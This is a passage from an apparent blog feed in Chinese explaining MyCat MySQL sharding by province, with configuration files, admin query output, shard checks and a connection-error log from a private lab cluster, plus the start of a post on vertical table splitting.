dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb29&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb30&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb30&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb31&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb31&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb32&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb32&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb33&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb33&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb34&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb34&quot; /&gt;&lt;dataNode name=&quot;dnmycatdb35&quot; dataHost=&quot;192.168.73.23&quot; database=&quot;jakingtestdb35&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A; 192.168.73.21 &#x76EE;&#x524D;&#x53EA;&#x914D;&#x4E86;&#x4E00;&#x53F0;&#x7269;&#x7406;&#x673A;&#xFF0C;&#x82E5;&#x8981;&#x505A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x90E8;&#x5206; --&gt;&lt;dataHost name=&quot;192.168.73.21&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt;&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;&lt;!-- can have multi write hosts --&gt;&lt;writeHost host=&quot;192.168.73.21&quot; url=&quot;192.168.73.21:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;&lt;/dataHost&gt;&lt;dataHost name=&quot;192.168.73.22&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt;&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;&lt;!-- can have multi write hosts --&gt;&lt;writeHost host=&quot;192.168.73.22&quot; url=&quot;192.168.73.22:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;&lt;/dataHost&gt;&lt;dataHost name=&quot;192.168.73.23&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot;writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt;&lt;heartbeat&gt;select user()&lt;/heartbeat&gt;&lt;!-- can have multi write hosts --&gt;&lt;writeHost host=&quot;192.168.73.23&quot; url=&quot;192.168.73.23:3306&quot; user=&quot;root&quot; password=&quot;ccc.456&quot; /&gt;&lt;/dataHost&gt;&lt;/mycat:schema&gt;</code></pre><p><code>rule.xml</code></p><pre><code class="xml">&lt;!DOCTYPE mycat:rule SYSTEM &quot;rule.dtd&quot;&gt;&lt;mycat:rule xmlns:mycat=&quot;http://io.mycat/&quot;&gt;&lt;tableRule name=&quot;sharding-by-intfile-mycatdb-jakingtest_member&quot;&gt;&lt;rule&gt;    &lt;columns&gt;region&lt;/columns&gt;    &lt;algorithm&gt;hash-int&lt;/algorithm&gt;&lt;/rule&gt;&lt;/tableRule&gt;&lt;function name=&quot;hash-int&quot; class=&quot;io.mycat.route.function.PartitionByFileMap&quot;&gt;    &lt;property name=&quot;mapFile&quot;&gt;partition-hash-int-mycatdb-jakingtest_member.txt&lt;/property&gt;    &lt;property name=&quot;type&quot;&gt;1&lt;/property&gt;    &lt;property name=&quot;defaultNode&quot;&gt;0&lt;/property&gt;&lt;!-- type &#x9ED8;&#x8BA4;&#x503C;&#x4E3A;0&#xFF0C;0&#x8868;&#x793A;integer&#xFF0C;&#x975E;&#x96F6;&#x8868;&#x793A;string,&#x6240;&#x6709;&#x8282;&#x70B9;&#x914D;&#x7F6E;&#x90FD;&#x662F;&#x4ECE;0&#x5F00;&#x59CB;&#xFF0C;&#x53CA;0&#x4EE3;&#x8868;&#x8282;&#x70B9;1 --&gt;&lt;/function&gt;&lt;/mycat:rule&gt;</code></pre><p><code>partition-hash-int-mycatdb-jakingtest_member.txt</code></p><pre><code>vim /mysql/app/mycat/conf/partition-hash-int-mycatdb-jakingtest_member.txt</code></pre><pre><code>&#x5317;&#x4EAC;&#x5E02;=0&#x4E0A;&#x6D77;&#x5E02;=1&#x4E91;&#x5357;&#x7701;=2&#x5185;&#x8499;&#x53E4;=3&#x8D35;&#x5DDE;&#x7701;=4&#x91CD;&#x5E86;&#x5E02;=5&#x53F0;&#x6E7E;&#x7701;=6&#x5409;&#x6797;&#x7701;=7&#x56DB;&#x5DDD;&#x7701;=8&#x5929;&#x6D25;&#x5E02;=9&#x5B81;&#x590F;&#x7701;=10&#x5B89;&#x5FBD;&#x7701;=11&#x5C71;&#x4E1C;&#x7701;=12&#x5C71;&#x897F;&#x7701;=13&#x5E7F;&#x4E1C;&#x7701;=14&#x5E7F;&#x897F;&#x7701;=15&#x65B0;&#x7586;&#x7701;=16&#x6C5F;&#x82CF;&#x7701;=17&#x6C5F;&#x897F;&#x7701;=18&#x6CB3;&#x5317;&#x7701;=19&#x6CB3;&#x5357;&#x7701;=20&#x6D59;&#x6C5F;&#x7701;=21&#x6D77;&#x5357;&#x7701;=22&#x6E56;&#x5317;&#x7701;=23&#x6E56;&#x5357;&#x7701;=24&#x6FB3;&#x95E8;=25&#x7518;&#x8083;&#x7701;=26&#x798F;&#x5EFA;&#x7701;=27&#x897F;&#x85CF;=28&#x8FBD;&#x5B81;&#x7701;=29&#x9655;&#x897F;&#x7701;=30&#x9752;&#x6D77;&#x7701;=31&#x9999;&#x6E2F;=32&#x9ED1;&#x9F99;&#x6C5F;&#x7701;=33DEFAULT_NODE=34</code></pre><h3 id="&#x68C0;&#x67E5;MyCat"><a href="#&#x68C0;&#x67E5;MyCat" class="headerlink" title="&#x68C0;&#x67E5;MyCat"></a>&#x68C0;&#x67E5;MyCat</h3><pre><code class="sql">mysql&gt; show @@databases;+----------+| DATABASE |+----------+| mycatdb  |+----------+1 row in set (0.01 sec)mysql&gt; show @@datasource;+-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+| DATANODE    | NAME          | TYPE  | HOST          | PORT | W/R  | ACTIVE | IDLE | SIZE | EXECUTE | READ_LOAD | WRITE_LOAD |+-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+| dnmycatdb22 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb23 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb20 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb21 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb4  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb19 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb5  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb2  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb17 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb3  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb18 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb15 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb1  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb16 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb13 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb35 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb14 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb8  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb9  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb6  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb7  | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb11 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb33 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb12 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb34 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb31 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb10 | 192.168.73.21 | mysql | 192.168.73.21 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb32 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb30 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb28 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb29 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb26 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb27 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb24 | 192.168.73.22 | mysql | 192.168.73.22 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 || dnmycatdb25 | 192.168.73.23 | mysql | 192.168.73.23 | 3306 | W    |      0 |    0 | 1000 |       0 |         0 |          0 |+-------------+---------------+-------+---------------+------+------+--------+------+------+---------+-----------+------------+35 rows in set (0.01 sec)mysql&gt; show @@heartbeat;+---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+| NAME          | TYPE  | HOST          | PORT | RS_CODE | RETRY | STATUS | TIMEOUT | EXECUTE_TIME | LAST_ACTIVE_TIME    | STOP  |+---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+| 192.168.73.21 | mysql | 192.168.73.21 | 3306 |      -1 |     1 | idle   |   30000 | 14,2443,2443 | 2022-05-10 00:17:53 | false || 192.168.73.22 | mysql | 192.168.73.22 | 3306 |      -1 |     1 | idle   |   30000 | 15,2443,2443 | 2022-05-10 00:17:53 | false || 192.168.73.23 | mysql | 192.168.73.23 | 3306 |      -1 |     1 | idle   |   30000 | 16,2444,2444 | 2022-05-10 00:17:53 | false |+---------------+-------+---------------+------+---------+-------+--------+---------+--------------+---------------------+-------+3 rows in set (0.01 sec)mysql&gt;</code></pre><h3 id="&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;"><a href="#&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;" class="headerlink" title="&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;"></a>&#x5BFC;&#x5165;&#x6570;&#x636E;&#x5E93;</h3><p>&#x6CE8;&#x610F;&#xFF1A;&#x4E00;&#x5B9A;&#x8981;&#x628A;3&#x4E2A;&#x8282;&#x70B9;&#x7684;MySQL &#x81EA;&#x52A8;&#x63D0;&#x4EA4;&#x7684;&#x53C2;&#x6570;&#x6253;&#x5F00;&#xFF01;</p><pre><code class="sql">set global autocommit=1;show variables like &quot;%autocommit%&quot;;</code></pre><pre><code>mysql -h192.168.73.20 -P8066 -uroot -p123456 mycatdb &lt; jakingtest_member.sql</code></pre><h3 id="&#x67E5;&#x8BE2;&#x6570;&#x636E;"><a href="#&#x67E5;&#x8BE2;&#x6570;&#x636E;" class="headerlink" title="&#x67E5;&#x8BE2;&#x6570;&#x636E;"></a>&#x67E5;&#x8BE2;&#x6570;&#x636E;</h3><pre><code class="sql">mysql&gt; use mycatdbReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;+-------------------+| Tables in mycatdb |+-------------------+| jaking_member     |+-------------------+1 row in set (0.00 sec)mysql&gt; select count(*) from jaking_member;+--------+| COUNT0 |+--------+|  50000 |+--------+1 row in set (0.03 sec)mysql&gt; select * from jaking_member where id = 20000210;+----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+| ID       | NAME           | AGE | SEX | CARDID      | JOINDATE            | REGION    | TEL         | EMAIL            | RECOMMEND                | IDENTIFIER                                         |+----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+| 20000210 | jaking20000210 |  31 | &#x7537;  | 10050307335 | 2015-12-25 11:50:51 | &#x4E0A;&#x6D77;&#x5E02;    | 13108379727 | 123359043@qq.com | &#x5F6D;&#x7406;&#x90A6;&#x5C0F;&#x9C9C;&#x8089;&#x8001;&#x5E08;         | klbd muygjo xs iyz hqlghz duucn fjlap dgknrq kkz js ogsga hq cedyjm nzgmy unjpy kky jjh zevor juctq  |+----------+----------------+-----+-----+-------------+---------------------+-----------+-------------+------------------+--------------------------+------------------------------------------------------------------------------------------------------+1 row in set (0.02 sec)-- &#x67E5;&#x8BE2;&#x6570;&#x636E;&#x91CF;mysql&gt; select table_schema,table_name as &quot;Tables&quot;,ROUND(((data_length + index_length)/1024/1024), 2) &quot;Size in MB&quot; from information_schema.TABLES where TABLE_NAME = &quot;jaking_member&quot; order by (data_length + index_length) desc;+----------------+---------------+------------+| table_schema   | Tables        | Size in MB |+----------------+---------------+------------+| jakingtestdb01 | jaking_member |       1.52 || jakingtestdb02 | jaking_member |       0.41 || jakingtestdb05 | jaking_member |       0.39 || jakingtestdb03 | jaking_member |       0.39 || jakingtestdb11 | jaking_member |       0.39 || jakingtestdb08 | jaking_member |       0.39 || jakingtestdb07 | jaking_member |       0.39 || jakingtestdb06 | jaking_member |       0.38 || jakingtestdb04 | jaking_member |       0.38 || jakingtestdb12 | jaking_member |       0.38 || jakingtestdb09 | jaking_member |       0.38 || jakingtestdb10 | jaking_member |       0.36 |+----------------+---------------+------------+12 rows in set (0.01 sec)mysql&gt;</code></pre><h3 id="&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;"><a href="#&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;" class="headerlink" title="&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;"></a>&#x67E5;&#x770B;&#x5206;&#x7247;&#x6570;&#x636E;</h3><p><strong>192.168.73.21</strong></p><pre><code class="sql">mysql&gt; select count(*) ,region from jakingtestdb10.jaking_member group by region;+----------+-----------+| count(*) | region    |+----------+-----------+|     1363 | &#x5929;&#x6D25;&#x5E02;    |+----------+-----------+1 row in set (0.01 sec)mysql&gt;</code></pre><p><strong>192.168.73.22</strong></p><pre><code class="sql">mysql&gt; select count(*) ,region from jakingtestdb20.jaking_member group by region;+----------+-----------+| count(*) | region    |+----------+-----------+|     1448 | &#x6CB3;&#x5317;&#x7701;    |+----------+-----------+1 row in set (0.00 sec)</code></pre><p><strong>192.168.73.23</strong></p><pre><code class="sql">mysql&gt; select count(*) ,region from jakingtestdb30.jaking_member group by region;+----------+-----------+| count(*) | region    |+----------+-----------+|     1448 | &#x8FBD;&#x5B81;&#x7701;    |+----------+-----------+1 row in set (0.00 sec)mysql&gt;</code></pre><h2 id="&#x6545;&#x969C;"><a href="#&#x6545;&#x969C;" class="headerlink" title="&#x6545;&#x969C;"></a>&#x6545;&#x969C;</h2><pre><code class="mbox">2022-05-10 01:28:18.943  INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.net.AbstractConnection.close(AbstractConnection.java:520)) - close connection,reason:stream closed ,MySQLConnection [id=53, lastTime=1652117298929, user=root, schema=jakingtestdb04, old shema=jakingtestdb04, borrowed=false, fromSlaveDB=false, threadId=634, charset=utf8, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.21, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.net.AbstractConnection.close(AbstractConnection.java:520)) - close connection,reason:stream closed ,MySQLConnection [id=54, lastTime=1652117298929, user=root, schema=jakingtestdb35, old shema=jakingtestdb35, borrowed=false, fromSlaveDB=false, threadId=566, charset=latin1, txIsolation=3, autocommit=true, attachment=null, respHandler=null, host=192.168.73.23, port=3306, statusSync=null, writeQueue=0, modifiedSQLExecuted=false]2022-05-10 01:28:18.944  INFO [$_NIOREACTOR-0-RW] (io.mycat.backend.datasource.PhysicalDatasource$1$1.connectionError(PhysicalDatasource.java:508)) - connection connectionError</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;MyCat&amp;#x5206;&amp;#x7247;&amp;#x679A;&amp;#x4E3E;&amp;#x64CD;&amp;#x4F5C;&amp;#x2014;&amp;#x2014;&amp;#x5168;&amp;#x56FD;&amp;#x7701;&amp;#x4EFD;&amp;#x5206;&amp;#x7247;&quot;&gt;&lt;a href=&quot;#MyC
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MyCat垂直分表操作</title>
    <link href="https://marnm.github.io//posts/176dc5f3/"/>
    <id>https://marnm.github.io//posts/176dc5f3/</id>
    <published>2022-06-07T04:46:29.000Z</published>
    <updated>2022-06-07T05:10:57.425Z</updated>
    
    <content type="html"><![CDATA[<p><code>schema.xml</code></p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE mycat:schema SYSTEM &quot;schema.dtd&quot;&gt;&lt;mycat:schema xmlns:mycat=&quot;http://io.mycat/&quot;&gt;    &lt;!-- &#x903B;&#x8F91;&#x5E93;&#x914D;&#x7F6E; mycatdb1,mycatdb2,mycatdb3 &#x662F;&#x903B;&#x8F91;&#x5E93;&#x5E76;&#x4E0D;&#x662F;&#x771F;&#x7684;&#x6570;&#x636E;&#x5E93;--&gt;    &lt;!-- &#x5176;&#x4E2D; checkSQLschema &#x8868;&#x660E;&#x662F;&#x5426;&#x68C0;&#x67E5;&#x5E76;&#x8FC7;&#x6EE4; SQL &#x4E2D;&#x5305;&#x542B; schema &#x7684;&#x60C5;&#x51B5;:    &#x5982;&#x903B;&#x8F91;&#x5E93;&#x4E3A; mycatdb1&#xFF0C;&#x5219;&#x53EF;&#x80FD;&#x5199;&#x4E3A; select * from mycatdb1.jakingtestdb11&#xFF0C;    &#x6B64;&#x65F6;&#x4F1A;&#x81EA;&#x52A8;&#x8FC7;&#x6EE4; mycatdb1&#xFF0C;SQL &#x53D8;&#x4E3A; select * from jakingtestdb11&#xFF0C;&#x82E5;&#x4E0D;&#x4F1A;&#x51FA;&#x73B0;&#x4E0A;&#x8FF0;&#x5199;&#x6CD5;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x5173;&#x95ED;&#x5C5E;&#x6027;&#x4E3A; false        checkSQLschema=&quot;false&quot;    select * from mycatdb1.jakingtestdb11;    checkSQLschema=&quot;true&quot;     select * from jakingtestdb11;   --&gt;     &lt;!-- sqlMaxLimit &#x9ED8;&#x8BA4;&#x8FD4;&#x56DE;&#x7684;&#x6700;&#x5927;&#x8BB0;&#x5F55;&#x6570;&#x9650;&#x5236;&#xFF0C;MyCat1.4 &#x7248;&#x672C;&#x91CC;&#x9762;&#xFF0C;&#x7528;&#x6237;&#x7684; Limit &#x53C2;&#x6570;&#x4F1A; &#x8986;&#x76D6;&#x6389; MyCat &#x7684; sqlMaxLimit &#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;--&gt;&lt;!-- &#x6BCF;&#x4E2A;&#x903B;&#x8F91;&#x5E93;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A; schema ,&#x6BCF;&#x4E2A;schema &#x5BF9;&#x5E94;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x8282;&#x70B9; --&gt;&lt;schema name=&quot;mycatdb1&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb1&quot;/&gt;&lt;schema name=&quot;mycatdb2&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb2&quot;/&gt; &lt;schema name=&quot;mycatdb3&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb3&quot;/&gt; &lt;schema name=&quot;mycatdb4&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb4&quot;/&gt; &lt;schema name=&quot;mycatdb5&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb5&quot;/&gt; &lt;schema name=&quot;mycatdb6&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb6&quot;/&gt; &lt;schema name=&quot;mycatdb7&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb7&quot;/&gt; &lt;schema name=&quot;mycatdb8&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb8&quot;/&gt; &lt;schema name=&quot;mycatdb9&quot; checkSQLschema=&quot;false&quot; sqlMaxLimit=&quot;100&quot; dataNode=&quot;dnmycatdb9&quot;/&gt;    &lt;!-- &#x8868;&#x5206;&#x7247;&#x914D;&#x7F6E;&#x5728;&#x8FD9;&#x91CC; --&gt;     &lt;!--&lt;/schema&gt; --&gt;     &lt;!-- &#x5B9A;&#x4E49; MyCat &#x7684;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF0C;&#x8282;&#x70B9;&#x914D;&#x7F6E; jakingtestdb01,jakingtestdb02,jakingtestdb03 &#x624D;&#x662F;&#x771F;&#x6B63;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;         dataNode &#x4E2D;&#x7684; name &#x6570;&#x636E;&#x8868;&#x793A;&#x8282;&#x70B9;&#x540D;&#x79F0;&#xFF0C; dataHost &#x8868;&#x793A;&#x6570;&#x636E;&#x4E3B;&#x673A;&#x540D;&#x79F0;&#xFF0C;         database &#x8868;&#x793A;&#x8BE5;&#x8282;&#x70B9;&#x8981;&#x8DEF;&#x7531;&#x7684;&#x6570;&#x636E;&#x5E93;&#x7684;&#x540D;&#x79F0; --&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb1-3 &#x5BF9;&#x5E94;&#x7684; 192.168.10.12 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt; &lt;dataNode name=&quot;dnmycatdb1&quot; dataHost=&quot;jaking12&quot; database=&quot;jakingtestdb01&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb2&quot; dataHost=&quot;jaking12&quot; database=&quot;jakingtestdb02&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb3&quot; dataHost=&quot;jaking12&quot; database=&quot;jakingtestdb03&quot; /&gt;&lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb4-6 &#x5BF9;&#x5E94;&#x7684; 192.168.10.13 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt; &lt;dataNode name=&quot;dnmycatdb4&quot; dataHost=&quot;jaking13&quot; database=&quot;jakingtestdb04&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb5&quot; dataHost=&quot;jaking13&quot; database=&quot;jakingtestdb05&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb6&quot; dataHost=&quot;jaking13&quot; database=&quot;jakingtestdb06&quot; /&gt; &lt;!-- &#x8BBE;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x70B9; dnmycatdb7-9 &#x5BF9;&#x5E94;&#x7684; 192.168.10.14 &#x670D;&#x52A1; &#x4EE5;&#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x7269;&#x7406; schema --&gt; &lt;dataNode name=&quot;dnmycatdb7&quot; dataHost=&quot;jaking14&quot; database=&quot;jakingtestdb07&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb8&quot; dataHost=&quot;jaking14&quot; database=&quot;jakingtestdb08&quot; /&gt; &lt;dataNode name=&quot;dnmycatdb9&quot; dataHost=&quot;jaking14&quot; database=&quot;jakingtestdb09&quot; /&gt;    &lt;!-- &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x7684;&#x914D;&#x7F6E; --&gt;    &lt;!-- dataHost &#x914D;&#x7F6E;&#x7684;&#x662F;&#x5B9E;&#x9645;&#x7684;&#x540E;&#x7AEF;&#x6570;&#x636E;&#x5E93;&#x96C6;&#x7FA4;&#xFF08;&#x5F53;&#x7136;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x975E;&#x96C6;&#x7FA4;&#xFF09; --&gt;    &lt;!-- &#x6CE8;&#x610F;&#xFF1A; schema &#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A; dataHost &#x4E2D;&#x7684; host &#x5C5E;&#x6027;&#x503C;&#x5FC5;&#x987B;&#x552F;&#x4E00;&#xFF0C;&#x5426;&#x5219;&#x4F1A;&#x51FA;&#x73B0;&#x4E3B;&#x4ECE;&#x5728;&#x6240;&#x6709; dataHost &#x4E2D;&#x5168;&#x90E8;&#x5207;&#x6362;&#x7684;&#x73B0;&#x8C61; --&gt;    &lt;!-- &#x5B9A;&#x4E49;&#x6570;&#x636E;&#x4E3B;&#x673A; dtHost1&#xFF0C;&#x53EA;&#x8FDE;&#x63A5;&#x5230; MySQL &#x8BFB;&#x5199;&#x5206;&#x79BB;&#x96C6;&#x7FA4;&#x4E2D;&#x7684; Master &#x8282;&#x70B9;&#xFF0C;&#x4E0D;&#x4F7F;&#x7528; MyCat &#x6258;&#x7BA1; MySQL &#x4E3B;&#x4ECE;&#x5207;&#x6362; --&gt;    &lt;!--         &lt;dataHost name=&quot;dtHost1&quot; maxCon=&quot;500&quot; minCon=&quot;20&quot; balance=&quot;0&quot;         writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot; switchType=&quot;1&quot; slaveThreshold=&quot;100&quot;&gt;         &lt;heartbeat&gt;select user()&lt;/heartbeat&gt;         &lt;writeHost host=&quot;hostM1&quot; url=&quot;192.168.10.63:3306&quot; user=&quot;root&quot; password=&quot;lyz&quot; /&gt;         &lt;/dataHost&gt;     --&gt;&lt;!-- &#x8BBE;&#x5B9A; 192.168.10.12 &#x76EE;&#x524D;&#x53EA;&#x914D;&#x4E86;&#x4E00;&#x53F0;&#x7269;&#x7406;&#x673A;&#xFF0C;&#x82E5;&#x8981;&#x505A;&#x8BFB;&#x5199;&#x5206;&#x79BB;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0A;&#x9762;&#x7684;&#x90E8;&#x5206; --&gt; &lt;dataHost name=&quot;jaking12&quot; maxCon=&quot;1000&quot; minCon=&quot;10&quot; balance=&quot;1&quot; writeType=&quot;0&quot; dbType=&quot;mysql&quot; dbDriver=&quot;native&quot;&gt; &lt;heartbeat&gt;select user()&lt;/heartbeat&gt; &lt;!-- can have multi write hosts --&gt; &lt;writeHost host=&quot;192.168.10.12&quot; url=&quot;192.168.10.12:3306&quot; user=&quot;root&quot; password=&quot;123456&quot; /&gt; &lt;/dataHost&gt;&lt;dataHost name=&quot;jaking13&quot; 